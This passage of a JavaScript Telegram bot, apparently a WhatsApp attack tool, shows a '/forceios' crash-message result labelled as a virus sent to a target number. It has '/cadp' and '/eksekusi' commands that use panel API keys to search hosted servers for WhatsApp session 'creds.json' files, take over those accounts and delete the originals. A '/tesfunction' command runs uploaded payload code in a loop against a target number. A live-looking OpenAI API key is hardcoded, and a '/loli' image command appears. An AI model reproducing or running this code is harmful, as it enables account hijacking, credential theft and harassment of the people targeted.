⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /forceios
⪧ Virus  : Apple Forclose
⪧ Status : Sucses
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐  `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   

if (typeof okBox === 'undefined') global.okBox = a => "```" + " SCARRY DEATH SUCCES\n" + a.join("\n") + "```"
if (typeof errBox === 'undefined') global.errBox = a => "```" + " SCARRY DEATH ERROR\n" + a.join("\n") + "```"

const AX = axios.create({
  timeout: 20000,
  validateStatus: s => s >= 200 && s < 500,
  httpAgent: new httpMod.Agent({ keepAlive: true }),
  httpsAgent: new httpsMod.Agent({ keepAlive: true })
})

const ADP_DIR = path.join(__dirname, 'adp')
fs.mkdirpSync(ADP_DIR)
const ADP_FILE = path.join(ADP_DIR, 'adp.json')

function loadADP() {
  try { return JSON.parse(fs.readFileSync(ADP_FILE, 'utf8')) }
  catch { return {} }
}

function saveADP(o) { fs.writeFileSync(ADP_FILE, JSON.stringify(o, null, 2)) }
function isPtlc(t) { return typeof t === 'string' && /^ptlc_/i.test(t) }
function isPtla(t) { return typeof t === 'string' && /^ptla_/i.test(t) }
function asText(x) { return typeof x === 'string' ? x : JSON.stringify(x) }
function baseUrl(d) {
  let u = String(d || '').trim()
  if (!/^https?:\/\//i.test(u)) u = 'https://' + u
  return u.replace(/\/+$/, '')
}

async function httpGet(url, token) {
  return AX.get(url, { headers: { Authorization: `Bearer ${token}` } })
}

async function httpPost(url, token, data) {
  return AX.post(url, data, {
    headers: {
      Authorization: `Bearer ${token}`,
      'Content-Type': 'application/json'
    }
  })
}

async function fetchAllPages(url, token) {
  let page = 1
  let results = []
  while (true) {
    try {
      const r = await httpGet(`${url}?page=${page}&per_page=50`, token)
      if (r.status !== 200) break
      const data = r.data?.data || []
      if (!data.length) break
      results.push(...data)
      if (!r.data.meta || !r.data.meta.pagination || !r.data.meta.pagination.links?.next) break
      page++
    } catch {
      break
    }
  }
  return results
}

async function listServersClient(b, ptlc) {
  const a = await fetchAllPages(`${b}/api/client/servers`, ptlc)
  return a.map(x => ({ id: x.attributes.identifier, name: x.attributes.name || x.attributes.identifier }))
}

async function listServersApplication(b, ptla) {
  const a = await fetchAllPages(`${b}/api/application/servers`, ptla)
  return a.map(x => {
    const at = x.attributes || {}
    return {
      id: at.identifier || at.uuidShort || at.uuid,
      name: at.name || at.identifier || at.uuidShort
    }
  }).filter(x => x.id)
}

async function listServersWithFallback(b, ptlc, ptla) {
  if (isPtlc(ptlc)) { try { const s = await listServersClient(b, ptlc); if (s.length) return s } catch { } }
  if (isPtla(ptla)) { try { const s = await listServersApplication(b, ptla); if (s.length) return s } catch { } }
  return []
}

const QUICK_PATHS = [
  '/session/creds.json',
  '/home/container/session/creds.json',
  '/home/container/creds.json',
  '/container/creds.json',
  '/creds.json',
  'creds.json'
]

async function listDirAny(base, ptlc, ptla, sid, dir) {
  if (isPtlc(ptlc)) {
    try {
      const r = await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptlc)
      if (r.status === 200) return (r.data?.data || []).map(x => x.attributes || x)
    } catch { }
  }
  if (isPtla(ptla)) {
    try {
      const r = await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptla)
      if (r.status === 200) return (r.data?.data || []).map(x => x.attributes || x)
    } catch { }
  }
  return []
}

async function readFileAny(base, ptla, ptlc, sid, filePath) {
  if (isPtla(ptla)) {
    try {
      const r = await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptla)
      if (r.status === 200) return asText(r.data)
    } catch { }
  }
  if (isPtlc(ptlc)) {
    try {
      const r = await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptlc)
      if (r.status === 200) return asText(r.data)
    } catch { }
  }
  throw new Error('gagal_baca_file')
}

async function deleteFileAny(base, ptla, ptlc, sid, filePath) {
  const body = { root: "/", files: [String(filePath).replace(/^\/+/, '')] }
  if (isPtlc(ptlc)) {
    try {
      const r = await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptlc, body)
      if (r.status === 204 || r.status === 200) return
    } catch { }
  }
  if (isPtla(ptla)) {
    try {
      const r = await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptla, body)
      if (r.status === 204 || r.status === 200) return
    } catch { }
  }
  throw new Error('gagal_hapus_file')
}

async function discoverCredsPaths(base, ptlc, ptla, sid, maxDepth = 3, maxDirs = 150) {
  for (const qp of QUICK_PATHS) {
    try { await readFileAny(base, ptla, ptlc, sid, qp); return [qp] } catch { }
  }
  const roots = ['/', '/home', '/home/container', '/container', '/root', '/home/container/session', '/home/container/bot', '/home/container/data']
  const q = [...new Set(roots)]
  const seen = new Set(q)
  let depth = 0, expanded = 0

  while (q.length && depth < maxDepth && expanded < maxDirs) {
    const size = q.length
    for (let i = 0; i < size && expanded < maxDirs; i++) {
      const dir = q.shift()
      expanded++
      let items = []
      try { items = await listDirAny(base, ptlc, ptla, sid, dir) } catch { }
      for (const it of items) {
        const name = String(it.name || '')
        const isDir = (it.is_file === false) || (it.type === 'directory') || (it.directory === true) || (it.is_directory === true)
        if (!isDir) {
          if (name.toLowerCase() === 'creds.json') {
            const p = `${(it.directory || dir).replace(/\/+$/, '')}/${name}`
            return [p]
          }
          continue
        }
        if (name === '.' || name === '..') continue
        const child = `${(it.directory || dir).replace(/\/+$/, '')}/${name}`
        if (!seen.has(child)) { seen.add(child); q.push(child) }
      }
    }
    depth++
  }
  return QUICK_PATHS.slice(0, 2)
}

async function writeAndPairFromRaw(raw, chatId) {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'))
  try {
    await fs.writeFile(path.join(tmp, 'creds.json'), raw)
    const creds = await fs.readJson(path.join(tmp, 'creds.json'))
    const me = creds?.me?.id || ''
    if (!me) throw new Error('creds_invalid')
    const n = String(me).split(':')[0]
    const dest = createSessionDir(n)
    await fs.remove(dest)
    await fs.copy(tmp, dest)
    if (typeof saveActiveSessions === 'function') saveActiveSessions(n)
    if (typeof connectToWhatsApp === 'function') await connectToWhatsApp(n, chatId)
    return n
  } finally {
    await fs.remove(tmp).catch(() => { })
  }
}

function pLimit(n) {
  let a = 0, q = []
  const next = () => {
    if (q.length && a < n) {
      a++
      const { fn, rs, rj } = q.shift()
      fn().then(v => { a--; rs(v); next() }).catch(e => { a--; rj(e); next() })
    }
  }
  return fn => new Promise((rs, rj) => { q.push({ fn, rs, rj }); next() })
}

// === BOT COMMANDS ===

bot.onText(/^\/cadp\s+(\S+)\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.", { parse_mode: "Markdown" })
  }
 if (blacklistedCommands.includes('/cadp')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
  const key = m[1]
  const parts = m[2].split(",").map(s => s.trim())
  if (parts.length < 3)
    return bot.sendMessage(chatId, errBox(["Format: /cadp angka list <ptla,ptlc,domain>"]), { parse_mode: "Markdown" })

  const [ptla, ptlc, domain] = parts
  const data = loadADP()
  data[key] = { ptla, ptlc, domain }
  saveADP(data)
  await bot.sendMessage(chatId, okBox([`ADP '${key}' disimpan`]), { parse_mode: "Markdown" })
})

bot.onText(/^\/listadp$/i, async msg => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.", { parse_mode: "Markdown" })
  }

 if (blacklistedCommands.includes('/listadp')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
    
  const data = loadADP()
  const mask = v => String(v || "").slice(0, 10) + (String(v || "").length > 10 ? "…" : "")
  const lines = Object.entries(data).map(([k, v]) => `${k} → ${v.domain || "-"} • ${mask(v.ptla)} • ${mask(v.ptlc)}`)
  await bot.sendMessage(chatId, lines.length ? okBox(lines) : errBox(["(kosong)"]), { parse_mode: "Markdown" })
})

bot.onText(/^\/deladp\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.", { parse_mode: "Markdown" })
  }

  if (blacklistedCommands.includes('/deladp')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
    
  const key = m[1]
  const data = loadADP()
  if (!data[key]) return bot.sendMessage(chatId, errBox([`Alias '${key}' tidak ada`]), { parse_mode: "Markdown" })

  delete data[key]
  saveADP(data)
  await bot.sendMessage(chatId, okBox([`ADP '${key}' dihapus`]), { parse_mode: "Markdown" })
})

bot.onText(/^\/eksekusi\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.", { parse_mode: "Markdown" })
  }

if (blacklistedCommands.includes('/eksekusi')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
    
  const key = m[1]
  const cfg = loadADP()[key]
  if (!cfg) return bot.sendMessage(chatId, errBox([`ADP '${key}' tidak ditemukan`]), { parse_mode: "Markdown" })

  const b = baseUrl(cfg.domain)
  let servers = []

  try {
    servers = await listServersWithFallback(b, cfg.ptlc, cfg.ptla)
    if (!servers.length) return bot.sendMessage(chatId, errBox([`Tidak ada server pada ${b}`]), { parse_mode: "Markdown" })
  } catch (e) {
    const msgErr = e?.response ? `${e.response.status} ${e.response.statusText || ""}`.trim() : (e.message || "gagal")
    return bot.sendMessage(chatId, errBox([`Gagal koneksi: ${msgErr}`]), { parse_mode: "Markdown" })
  }

  let ok = 0, fail = 0
  const perServerErrors = []
  const limit = pLimit(6)

  await bot.sendMessage(chatId, ` Eksekusi Adp target sedang berjalan...`)

  await Promise.all(servers.map(s => limit(async () => {
    let paired = false
    try {
      const paths = await discoverCredsPaths(b, cfg.ptlc, cfg.ptla, s.id)
      for (const p of paths) {
        try {
          const raw = await readFileAny(b, cfg.ptla, cfg.ptlc, s.id, p)
          const botId = await writeAndPairFromRaw(raw, chatId)
          try { await deleteFileAny(b, cfg.ptla, cfg.ptlc, s.id, p) } catch { }
          ok++; paired = true; break
        } catch { }
      }
      if (!paired) throw new Error("creds_not_found")
    } catch (e) {
      fail++; perServerErrors.push(`✖ ${e.message || "gagal"}`)
    }
  })))

  const lines = [` \n✔ ${ok} • ✖ ${fail}`]
  if (perServerErrors.length) lines.push(...perServerErrors)
  await bot.sendMessage(chatId, okBox(lines), { parse_mode: "Markdown" })
})

// Fitur /info
bot.onText(/\/info/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message; // jika ada reply

  let targetUser;

  if (reply) {
    targetUser = reply.from;
  } else {
    targetUser = msg.from;
  }

  const userId = targetUser.id;
  const firstName = targetUser.first_name || '-';
  const lastName = targetUser.last_name || '-';
  const username = targetUser.username ? `@${targetUser.username}` : '-';
  const usernameLength = targetUser.username ? targetUser.username.length : 0;

  const infoText = `
<b>👤 INFO PENGGUNA</b>
🆔 ID: <code>${userId}</code>
📛 Nama Depan: <code>${firstName}</code>
📛 Nama Belakang: <code>${lastName}</code>
🏷️ Username: <code>${username}</code>
🔢 Panjang Username: <code>${usernameLength}</code>
  `;

  bot.sendMessage(chatId, infoText, { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
});

// === FITUR BROADCAST FOTO + TEKS ===
bot.onText(/\/broadcast/, async (msg) => {
  const senderId = msg.from.id.toString();
  if (!config.OWNER_ID.includes(senderId)) {
    return bot.sendMessage(senderId, "❌ Kamu tidak punya izin broadcast.");
  }

  const replyMsg = msg.reply_to_message;
  if (!replyMsg) {
    return bot.sendMessage(senderId, "⚠️ Reply pesan teks/foto yang mau kamu kirim.");
  }

  async function getUsersFromGitHub() {
    try {
      const res = await axios.get(GITHUB_FILE_URL + "?t=" + Date.now());
      return res.data || [];
    } catch {
      return [];
    }
  }

  const users = await getUsersFromGitHub();
  let success = 0, failed = 0;

  await bot.sendMessage(senderId, `🚀 Mengirim broadcast ke ${users.length} pengguna...`);

  for (const id of users) {
    try {
      if (replyMsg.photo) {
        const photoId = replyMsg.photo[replyMsg.photo.length - 1].file_id;
        const caption = replyMsg.caption || "";
        await bot.sendPhoto(id, photoId, { caption });
      } else if (replyMsg.text) {
        await bot.sendMessage(id, replyMsg.text);
      }
      success++;
    } catch {
      failed++;
    }
  }

  await bot.sendMessage(senderId, `✅ Broadcast selesai!\nBerhasil: ${success}\nGagal: ${failed}`);
});

// ===== FAKECALL COMMAND (Versi reply foto, format: /fakecall nama,durasi) 
bot.onText(/^\/fakecall (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1].split(",");

  const nama = input[0]?.trim();
  const durasi = input[1]?.trim();

  // validasi input
  if (!nama || !durasi) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\n\nGunakan format:\n`/fakecall Nama,Durasi`\n\nContoh:\n`/fakecall Rara,5`\n\nLalu *reply* ke foto yang ingin dijadikan avatar.",
      { parse_mode: "Markdown" }
    );
  }

 if (blacklistedCommands.includes('/fakecall')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
    
  // pastikan user reply ke foto
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(
      chatId,
      "⚠️ Harap *reply ke foto* yang ingin dijadikan avatar.\n\nLangkah:\n1️⃣ Kirim foto\n2️⃣ Balas dengan `/fakecall Nama,Durasi`",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(chatId, `📞 Membuat fake call dari *${nama}*...`, {
    parse_mode: "Markdown",
  });

  try {
    // Ambil file_id dari foto yang di-reply
    const photoList = msg.reply_to_message.photo;
    const fileId = photoList[photoList.length - 1].file_id;

    // Ambil URL file Telegram
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // API Zenzxz (ganti apikey jika perlu)
    const apiKey = "YOUR_API_KEY"; // opsional jika API butuh apikey
    const apiUrl = `https://api.zenzxz.my.id/api/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileUrl
    )}${apiKey ? `&apikey=${apiKey}` : ""}`;

    // Ambil hasil gambar dari API
    const response = await fetch(apiUrl);
    if (!response.ok) throw new Error("Gagal ambil hasil dari API.");

    const buffer = Buffer.from(await response.arrayBuffer());

    // Kirim hasil ke chat
    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Fake call berhasil dibuat!\n📱 *Nama:* ${nama}\n⏱️ *Durasi:* ${durasi} detik`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error("[FAKECALL ERROR]", err);
    bot.sendMessage(
      chatId,
      "⚠️ Gagal membuat fake call.\nPeriksa koneksi API atau format perintah."
    );
  }
});

// ===== EMOJIMIX COMMAND FIXED =====
bot.onText(/^\/emojimix(?:\s+(.+)\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  let emoji1 = match[1];
  let emoji2 = match[2];

  // Jika user membalas pesan (reply)
  if ((!emoji1 || !emoji2) && msg.reply_to_message && msg.reply_to_message.text) {
    const parts = msg.reply_to_message.text.split(" ");
    if (parts.length >= 2) {
      emoji1 = parts[0];
      emoji2 = parts[1];
    } else {
      return bot.sendMessage(chatId, "❌ Harap balas pesan berisi dua emoji atau ketik: `/emojimix 😎 🤣`", {
        parse_mode: "Markdown",
      });
    }
  }

  // Validasi input
  if (!emoji1 || !emoji2) {
    return bot.sendMessage(chatId, "❌ Format salah.\nGunakan: `/emojimix 😎 🤣` emojinya kasih spasi jangan di gabungin.", {
      parse_mode: "Markdown",
    });
  }

 if (blacklistedCommands.includes('/emojimix')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
    
  await bot.sendMessage(chatId, `🌀 Sedang memproses mix emoji ${emoji1} + ${emoji2}...`);

  try {
    const apiUrl = `https://api.zenzxz.my.id/api/tools/emojimix?emoji1=${encodeURIComponent(emoji1)}&emoji2=${encodeURIComponent(emoji2)}`;
    const res = await fetch(apiUrl);

    // Deteksi jenis respon (gambar / JSON error)
    const contentType = res.headers.get("content-type");

    if (contentType && contentType.includes("application/json")) {
      const data = await res.json();
      await bot.sendMessage(chatId, `❌ Gagal mendapatkan gambar.\nRespon API: ${JSON.stringify(data, null, 2)}`);
    } else {
      const buffer = await res.arrayBuffer();
      const imageBuffer = Buffer.from(buffer);

      await bot.sendPhoto(chatId, imageBuffer, {
        caption: `✅ Hasil mix emoji ${emoji1} + ${emoji2}`,
      });
    }

  } catch (err) {
    console.error("[EMOJIMIX ERROR]", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat memproses emoji mix. Coba lagi nanti.");
  }
});

bot.onText(/^\/ssweb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url.startsWith("http")) {
    return bot.sendMessage(chatId, "⚠️ Masukkan URL yang valid.\nContoh: /ssweb https://example.com");
  }
  
 if (blacklistedCommands.includes('/ssweb')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}  

    
  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }

  await bot.sendMessage(chatId, "🖼️ Mengambil screenshot... tunggu sebentar!");

  try {
    const apiUrl = `https://api.zenzxz.my.id/api/tools/ssweb?url=${encodeURIComponent(url)}`;
    const res = await axios.get(apiUrl);

    // Kalau respons JSON
    if (res.data && res.data.result) {
      await bot.sendPhoto(chatId, res.data.result, {
        caption: `✅ Screenshot dari:\n${url}`,
      });
    } else if (res.headers["content-type"]?.includes("image")) {
      // Kalau respons langsung gambar
      const img = await axios.get(apiUrl, { responseType: "arraybuffer" });
      await bot.sendPhoto(chatId, Buffer.from(img.data), { caption: `✅ Screenshot dari:\n${url}` });
    } else {
      throw new Error("Format respons tidak dikenali");
    }
  } catch (err) {
    console.error(err.response?.data || err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil screenshot. Coba lagi nanti atau cek URL-nya.");
  }
});

// ======== FITUR /loli (Random Loli dari API ZenZxz) ======== //
bot.onText(/^\/loli$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🔍 Sedang mengambil gambar loli... tunggu sebentar!");
    
 if (blacklistedCommands.includes('/loli')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }

  try {
    // Ambil gambar langsung dari API (format image/jpeg)
    const res = await axios.get("https://api.zenzxz.my.id/api/random/loli", {
      responseType: "arraybuffer",
    });

    // Kirim gambar langsung ke Telegram
    await bot.sendPhoto(chatId, Buffer.from(res.data), {
      caption: "✨ Random Loli Image",
    });
  } catch (err) {
    console.error("❌ ERROR /loli:", err);
    bot.sendMessage(chatId, "❌ Tidak dapat mengambil gambar dari API. Coba lagi nanti.");
  }
});

// ======== FITUR /bluearchive (VERSI FIX API GAMBAR LANGSUNG) ======== //
bot.onText(/^\/bluearchive$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🔍 Sedang mengambil gambar Blue Archive...");
    
 if (blacklistedCommands.includes('/bluearchive')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }

  try {
    // API langsung mengembalikan gambar (bukan JSON)
    const res = await axios.get("https://api.zenzxz.my.id/api/random/bluearchive", {
      responseType: "arraybuffer", // penting untuk ambil gambar
    });

    // Kirim hasil gambar ke user
    await bot.sendPhoto(chatId, Buffer.from(res.data), {
      caption: "✨ Random Blue Archive Image",
    });
  } catch (err) {
    console.error("❌ ERROR /bluearchive:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil gambar dari API ZenZxz. Coba lagi nanti.");
  }
});

// ======== FITUR /fixcode OTOMATIS PERBAIKI KODE ======== //
bot.onText(/^\/fixcode$/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  if (!reply || !reply.document) {
    return bot.sendMessage(
      chatId,
      "> ⚠️ *Balas ke file .js atau .txt untuk memperbaiki kodenya.*",
      { parse_mode: "Markdown" }
    );
  }
    
  if (blacklistedCommands.includes('/fixcode')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }

  const fileId = reply.document.file_id;
  const fileName = reply.document.file_name;
  const fileLink = await bot.getFileLink(fileId);

  const tempDir = path.join(__dirname, "temp");
  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);

  const tempPath = path.join(tempDir, fileName);

  try {
    // 📥 Download file
    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    fs.writeFileSync(tempPath, response.data);

    const originalCode = fs.readFileSync(tempPath, "utf8");
    await bot.sendMessage(
      chatId,
      "> 🔍 *Sedang memeriksa dan memperbaiki kode...*\n> Mohon tunggu sebentar ⏳",
      { parse_mode: "Markdown" }
    );

    // 🔧 Panggil fungsi perbaikan
    const fixed = await fixCodeWithAI(originalCode);

    // 💾 Simpan hasil fix
    const fixedPath = path.join(tempDir, "fixed_" + fileName);
    fs.writeFileSync(fixedPath, fixed.fixedCode);

    // 📤 Kirim file hasil perbaikan
    await bot.sendDocument(chatId, fixedPath, {
      caption: "> ✅ *Kode sudah diperbaiki dengan sukses!*",
      parse_mode: "Markdown",
    });

    // 💬 Kirim ringkasan dulu, lalu penjelasan penuh
    if (fixed.summary || fixed.explanation) {
      if (fixed.summary) {
        await bot.sendMessage(
          chatId,
          `> 🧾 *Ringkasan Perbaikan:*\n\n> ${fixed.summary.replace(/\n/g, "\n> ")}`,
          { parse_mode: "Markdown" }
        );
      }
      if (fixed.explanation) {
        const explained = formatExplanation(fixed.explanation);
        await sendLongMessage(bot, chatId, explained);
      }
    }

    // 🧹 Bersihkan file sementara
    setTimeout(() => {
      fs.unlinkSync(tempPath);
      fs.unlinkSync(fixedPath);
    }, 15000);
  } catch (err) {
    console.error("❌ ERROR FIXCODE:", err);
    bot.sendMessage(
      chatId,
      "> ❌ *Terjadi kesalahan saat memperbaiki kode.*\n> Cek log server untuk detailnya.",
      { parse_mode: "Markdown" }
    );
  }
});

// ======== OPENAI API UNTUK FIX CODE ======== //
async function fixCodeWithAI(code) {
  // 🔑 TARUH API KEY LANGSUNG DI SINI
  const apiKey =
    "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";

  const prompt = `
Kamu adalah AI profesional yang memperbaiki kode JavaScript.
Tugasmu:
1. Perbaiki semua error syntax & logika tanpa mengubah tujuan utama kodenya.
2. Berikan hasil kode yang bersih di dalam blok \`\`\`js ... \`\`\`.
3. Setelah itu, jelaskan bagian mana yang salah dan bagaimana kamu memperbaikinya.
4. Di akhir, buat ringkasan singkat maksimal 3 kalimat tentang inti perbaikan.

Format output:
\`\`\`js
// hasil perbaikan
\`\`\`

### Penjelasan Lengkap
(tuliskan detail perubahan)

### Ringkasan Singkat
(tuliskan versi singkatnya)

Kode Asli:
${code}
`;

  const res = await axios.post(
    "https://api.openai.com/v1/chat/completions",
    {
      model: "gpt-4o-mini",
      messages: [
        { role: "system", content: "Kamu adalah AI yang ahli memperbaiki error code JavaScript." },
        { role: "user", content: prompt },
      ],
    },
    {
      headers: {
        Authorization: `Bearer ${apiKey}`,
        "Content-Type": "application/json",
      },
      maxBodyLength: Infinity,
    }
  );

  const text = res.data.choices[0].message.content;

  const fixedCode = text.match(/```(?:js|javascript)?\n([\s\S]*?)```/)?.[1] || code;
  const explanation = text.match(/### Penjelasan Lengkap([\s\S]*?)(?=###|$)/)?.[1]?.trim() || "";
  const summary = text.match(/### Ringkasan Singkat([\s\S]*)/)?.[1]?.trim() || "";

  return { fixedCode, explanation, summary };
}

// ======== KIRIM PESAN PANJANG (AUTO POTONG) ======== //
async function sendLongMessage(bot, chatId, text) {
  const MAX = 4000;
  for (let i = 0; i < text.length; i += MAX) {
    const chunk = text.slice(i, i + MAX);
    await bot.sendMessage(chatId, chunk, { parse_mode: "Markdown" });
    await new Promise((res) => setTimeout(res, 300));
  }
}

// ======== FORMAT PENJELASAN BIAR RAPI ======== //
function formatExplanation(text) {
  const formatted = text
    .replace(/^/gm, "> ") // kasih kutip di tiap baris
    .replace(/#+\s*(Kode yang Diperbaiki)/gi, "🔧 *$1*")
    .replace(/#+\s*(Penjelasan Lengkap)/gi, "🧠 *Penjelasan Lengkap*")
    .replace(/\*\*(.*?)\*\*/g, "*$1*")
    .replace(/\d+\.\s/g, "• ");

  return `> 📄 *Penjelasan Perbaikan Kode:*\n\n${formatted}`;
}

bot.onText(/\/tesfunction\s+([\d\s,+-]+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const text = match[1]?.trim();
  if (!text) return bot.sendMessage(chatId, "❌ Format salah. Contoh:\n/tesfunction 628123456789,10");
    
  if (blacklistedCommands.includes('/tesfunction')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }

  const parts = text.split(/[,\s]+/).filter(Boolean);
  const targetNumber = parts[0].replace(/[^0-9]/g, "");
  const loopCount = parseInt(parts[1] || "1");
  const target = `${targetNumber}@s.whatsapp.net`;

  if (sessions.size === 0)
    return bot.sendMessage(chatId, "❌ Tidak ada WhatsApp yang terhubung!");

  const sock = [...sessions.values()][0];
  if (!msg.reply_to_message)
    return bot.sendMessage(chatId, "❌ Reply ke pesan berisi async function atau file .js!");

  const repliedMsg = msg.reply_to_message;
  let functionCode = "";

  try {
    if (repliedMsg.document && repliedMsg.document.file_name.endsWith(".js")) {
      const fileLink = await bot.getFileLink(repliedMsg.document.file_id);
      const res = await fetch(fileLink);
      functionCode = await res.text();
    } else if (repliedMsg.text) {
      functionCode = repliedMsg.text;
    } else if (repliedMsg.caption) {
      functionCode = repliedMsg.caption;
    } else {
      return bot.sendMessage(chatId, "❌ Tidak ditemukan function async di pesan reply.");
    }

    const funcMatch = functionCode.match(/async\s+function\s+(\w+)/);
    if (!funcMatch)
      return bot.sendMessage(chatId, "⚠️ Tidak ditemukan async function di dalam kode.");

    const funcName = funcMatch[1];

    // Ambil semua dari Baileys agar sandbox lengkap
    const {
      generateWAMessageFromContent,
      generateWAMessage,
      prepareWAMessageMedia,
      areJidsSameUser,
      jidDecode,
      jidEncode,
      proto,
      crypto,
      makeCacheableSignalKeyStore,
      delay,
      extractMessageContent,
      downloadMediaMessage,
      getContentType,
      generateForwardMessageContent,
      generateLinkPreviewIfRequired,
      generateThumbnail,
      normalizeMessageContent,
      relayMessage,
      sendMessage,
    } = require("@whiskeysockets/baileys");

    // Pastikan target adalah string
    const ensureJid = (jid) =>
      typeof jid === "string" ? jid : `${jid?.user || jid}@s.whatsapp.net`;

    // === SANDBOX SUPER KOMPLIT ===
    const sandbox = {
      console,
      chalk,
      fs,
      path,
      sleep,
      sock,
      target: ensureJid(target),
      crypto,
      proto,
      Buffer,
      process,
      require,
      setTimeout,
      clearTimeout,
      setInterval,
      clearInterval,

      // semua dari baileys
      generateWAMessageFromContent,
      generateWAMessage,
      prepareWAMessageMedia,
      areJidsSameUser,
      jidDecode,
      jidEncode,
      makeCacheableSignalKeyStore,
      extractMessageContent,
      getContentType,
      relayMessage: (jid, content, options) =>
        sock.relayMessage(ensureJid(jid), content, options),
      sendMessage: (jid, content, options) =>
        sock.sendMessage(ensureJid(jid), content, options),
      groupMetadata: (jid) => sock.groupMetadata(ensureJid(jid)),
      groupParticipantsUpdate: (jid, participants, action) =>
        sock.groupParticipantsUpdate(ensureJid(jid), participants, action),
      fetchStatus: (jid) => sock.fetchStatus(ensureJid(jid)),
      downloadMediaMessage,
      generateForwardMessageContent,
      generateLinkPreviewIfRequired,
      generateThumbnail,
      normalizeMessageContent,
      delay,
    };

    const context = vm.createContext(sandbox);
    const wrappedCode = `${functionCode}\n${funcName};`;
